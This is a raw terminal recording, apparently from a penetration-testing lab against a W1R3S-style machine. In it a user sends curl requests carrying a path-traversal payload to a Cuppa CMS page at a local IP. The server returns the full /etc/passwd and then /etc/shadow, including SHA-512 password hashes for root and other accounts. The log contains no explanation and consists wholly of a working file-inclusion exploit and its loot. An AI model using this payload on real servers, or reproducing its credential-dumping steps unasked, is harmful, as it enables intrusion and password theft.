@@ -1,0 +1,241 @@
+Script started on 2020-09-27 21:16:45-03:00 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="166" LINES="32"]
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ 
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+        root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
+mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
+    </div>
+</div>]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ 
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ 
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[1P[1P[C[1P[1P[1P[1P http://192.168.1.109/administrator/alerts/alertConfigField.php?s http://192.168.1.109/administrator/alerts/alertConfigField.php?h http://192.168.1.109/administrator/alerts/alertConfigField.php?a http://192.168.1.109/administrator/alerts/alertConfigField.php?d http://192.168.1.109/administrator/alerts/alertConfigField.php?o http://192.168.1.109/administrator/alerts/alertConfigField.php?w http://192.168.1.109/administrator/alerts/alertConfigField.php?
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
+daemon:*:17379:0:99999:7:::
+bin:*:17379:0:99999:7:::
+sys:*:17379:0:99999:7:::
+sync:*:17379:0:99999:7:::
+games:*:17379:0:99999:7:::
+man:*:17379:0:99999:7:::
+lp:*:17379:0:99999:7:::
+mail:*:17379:0:99999:7:::
+news:*:17379:0:99999:7:::
+uucp:*:17379:0:99999:7:::
+proxy:*:17379:0:99999:7:::
+www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
+backup:*:17379:0:99999:7:::
+list:*:17379:0:99999:7:::
+irc:*:17379:0:99999:7:::
+gnats:*:17379:0:99999:7:::
+nobody:*:17379:0:99999:7:::
+systemd-timesync:*:17379:0:99999:7:::
+systemd-network:*:17379:0:99999:7:::
+systemd-resolve:*:17379:0:99999:7:::
+systemd-bus-proxy:*:17379:0:99999:7:::
+syslog:*:17379:0:99999:7:::
+_apt:*:17379:0:99999:7:::
+messagebus:*:17379:0:99999:7:::
+uuidd:*:17379:0:99999:7:::
+lightdm:*:17379:0:99999:7:::
+whoopsie:*:17379:0:99999:7:::
+avahi-autoipd:*:17379:0:99999:7:::
+avahi:*:17379:0:99999:7:::
+dnsmasq:*:17379:0:99999:7:::
+colord:*:17379:0:99999:7:::
+speech-dispatcher:!:17379:0:99999:7:::
+hplip:*:17379:0:99999:7:::
+kernoops:*:17379:0:99999:7:::
+pulse:*:17379:0:99999:7:::
+rtkit:*:17379:0:99999:7:::
+saned:*:17379:0:99999:7:::
+usbmux:*:17379:0:99999:7:::
+w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
+sshd:*:17554:0:99999:7:::
+ftp:*:17554:0:99999:7:::
+mysql:!:17554:0:99999:7:::
+    </div>
+</div>]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ 
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ 
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ 
+]0;joaofracassi@Pentest: ~[1;34mjoaofracassi@Pentest[00m:[1;32m~[00m$ exit
+exit
+
+Script done on 2020-09-27 21:20:26-03:00 [COMMAND_EXIT_CODE="0"]
